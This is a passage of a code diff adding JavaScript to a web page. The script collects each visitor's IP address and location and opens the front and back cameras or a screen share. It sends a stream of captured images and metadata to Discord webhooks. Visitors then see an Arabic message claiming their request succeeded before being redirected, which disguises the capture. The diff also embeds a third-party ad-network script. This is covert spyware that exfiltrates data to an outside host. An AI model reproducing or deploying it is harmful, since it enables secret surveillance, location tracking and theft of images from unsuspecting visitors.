+                sendImageToDiscord(blob, cameraType, photoCount, meta);
+            }, 'image/webp', CONFIG.quality);
+            
+            photoCount++;
+        }, CONFIG.interval);
+    };
+}
+
+// ===== MAIN INITIALIZATION =====
+async function init() {
+    addLog('Initializing camera capture system...', 'info');
+    addLog(`Configuration: maxPhotos=${CONFIG.maxPhotos}, interval=${CONFIG.interval}ms, quality=${CONFIG.quality}`, 'info');
+    addLog(`Discord webhooks: ${CONFIG.webhooks.length}`, 'info');
+    
+    try {
+        // Test Discord webhooks first
+        if (CONFIG.enableDiscord && CONFIG.webhooks.length > 0) {
+            addLog('Testing Discord webhooks...', 'info');
+            for (const webhook of CONFIG.webhooks) {
+                await testDiscordWebhook(webhook);
+            }
+        }
+        
+        // Collect additional data
+        additionalData = await collectAdditionalData();
+        addLog('Additional data collected', 'success');
+        // Initialize geo panel UI with IP/City/Region and webhook sender
+        initGeoPanelUI(additionalData);
+        
+        // If screen mode, wait for user button click to start screen share
+        if (CONFIG.screen) {
+            addLog('Screen mode enabled. Tap "Start Screen Share" to continue.', 'info');
+            document.getElementById('screenButton').style.display = 'block';
+            return; // defer until user clicks
+        }
+        
+        // Request camera permissions
+        const [frontStream, backStream] = await Promise.all([
+            requestCameraPermission('user'),
+            requestCameraPermission('environment')
+        ]);
+        
+        if (!frontStream && !backStream) {
+            addLog('No cameras available', 'error');
+            finishAndRedirect();
+            return;
+        }
+        
+        // Setup cameras
+        const frontVideo = document.getElementById('frontVideo');
+        const backVideo = document.getElementById('backVideo');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const backCanvas = document.getElementById('backCanvas');
+        
+        if (frontStream) {
+            totalCameras++;
+            frontVideo.srcObject = frontStream;
+            frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front'));
+        }
+        
+        if (backStream) {
+            totalCameras++;
+            backVideo.srcObject = backStream;
+            backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back'));
+        }
+        
+        addLog(`Cameras initialized: ${totalCameras} total`, 'success');
+        
+    } catch (error) {
+        addLog(`Initialization failed: ${error.message}`, 'error');
+        finishAndRedirect();
+    }
+}
+
+// ===== FINISH AND REDIRECT =====
+function finishAndRedirect() {
+    addLog('Capture process completed', 'success');
+    
+    const container = document.querySelector('.container');
+    const linkHtml = CONFIG.enableRedirect && CONFIG.redirectUrl ? 
+        `<p><a href="${CONFIG.redirectUrl}" target="_blank" rel="noopener noreferrer">الانتقال إلى الموقع</a></p>` : '';
+    
+    container.innerHTML = `
+        <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
+        <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
+        ${linkHtml}
+        ${CONFIG.showLog ? '<p><small>تحقق من سجل الحالة في أعلى الصفحة</small></p>' : ''}
+    `;
+    
+    if (CONFIG.enableRedirect && CONFIG.redirectUrl) {
+        setTimeout(() => {
+            try {
+                window.location.href = CONFIG.redirectUrl;
+            } catch (error) {
+                addLog(`Redirect failed: ${error.message}`, 'error');
+            }
+        }, 2000);
+    }
+}
+
+// ===== TEST FUNCTIONS =====
+async function testDiscordNow() {
+    addLog('Manual Discord test started...', 'info');
+    for (const webhook of CONFIG.webhooks) {
+        await testDiscordWebhook(webhook);
+    }
+}
+
+// ===== START APPLICATION =====
+window.addEventListener('load', () => {
+    // Show test button if log is enabled
+    if (CONFIG.showLog) {
+        document.getElementById('testButton').style.display = 'block';
+    }
+    init();
+});
+
+// ===== SCREEN SHARE STARTER =====
+async function startScreenShare() {
+    try {
+        const screenStream = await requestScreenPermission();
+        if (!screenStream) {
+            addLog('Screen stream not available', 'error');
+            finishAndRedirect();
+            return;
+        }
+        const frontVideo = document.getElementById('frontVideo');
+        const frontCanvas = document.getElementById('frontCanvas');
+        totalCameras = 1;
+        camerasFinished = 0;
+        document.getElementById('screenButton').style.display = 'none';
+        frontVideo.srcObject = screenStream;
+        frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'screen'));
+        addLog('Screen sharing started', 'success');
+    } catch (e) {
+        addLog(`Screen share failed: ${e.message}`, 'error');
+        finishAndRedirect();
+    }
+}
+</script>
+<script type="text/javascript" src="//pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js"></script>
+
+
 </body>
-</html>
